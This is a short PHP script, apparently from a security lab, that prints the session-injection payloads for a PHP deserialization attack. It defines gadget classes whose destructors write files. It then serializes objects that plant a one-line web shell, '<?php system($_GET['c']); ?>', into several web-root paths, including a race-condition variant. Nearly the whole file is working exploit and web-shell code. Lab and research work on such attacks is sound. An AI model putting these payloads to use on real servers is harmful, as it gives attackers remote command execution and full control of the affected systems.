<?php
// prints the raw injection strings (PHP_SESSION_UPLOAD_PROGRESS values and
# session-stored strings) used by the lab, so lengths are always exact.
$shell = "<?php system(\$_GET['c']); ?>";
$marker = new MarkerGadget();
$marker->cmd = "A4MARK";
$w1 = new DeferredWriter();
$w1->path = "/tmp/p2s_ap/html/up_shell.php";
$w1->data = $shell;
$w2 = new DeferredWriter();
$w2->path = "/tmp/p2s_ap/html/prefs_shell.php";
$w2->data = $shell;
$w3 = new DeferredWriter();
$w3->path = "/tmp/p2s_ap/html/up_race_shell.php";
$w3->data = $shell;
$w4 = new DeferredWriter();
$w4->path = "/tmp/p2s_fin/html/fin85_shell.php";
$w4->data = $shell;

class MarkerGadget {
    public $cmd; public $tag = "TAG";
    public function __wakeup()   { file_put_contents("/tmp/p2s_ap/MARK_WAKE.txt", "wakeup " . $this->cmd . "\n", FILE_APPEND); }
    public function __destruct() { file_put_contents("/tmp/p2s_ap/MARK_DEST.txt", "destruct " . $this->cmd . "\n", FILE_APPEND); }
}
class DeferredWriter {
    public $path; public $data;
    public function __destruct() { file_put_contents($this->path, $this->data); }
}

echo "P_MARK="  . "inj|" . serialize($marker) . "\n";
echo "P_UPWR="  . "inj|" . serialize($w1) . "\n";
echo "P_PRWR="  . "inj|" . serialize($w2) . "\n";
echo "P_RACE="  . "inj|" . serialize($w3) . "\n";
echo "P_FIN85=" . "inj|" . serialize($w4) . "\n";
echo "P_SHELL=" . $shell . " __halt_compiler();\n";
